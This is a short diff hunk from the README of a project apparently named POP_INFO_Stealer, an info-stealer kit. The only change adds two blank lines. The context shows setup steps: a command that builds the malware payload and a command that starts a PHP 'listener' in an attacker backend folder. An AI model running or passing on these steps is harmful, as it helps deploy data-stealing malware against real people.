@@ -7,6 +7,8 @@ python3
 7z
 # building payload
 `cd pop_add_bilder;python3 pop_add_bilder.py`
+
+
 ![ building payload](https://raw.githubusercontent.com/shiky8/POP_INFO_Stealer/main/dems/buliding.png)
 # listener
 `cd Attacker_backend;sudo php -S 127.0.0.1:80`
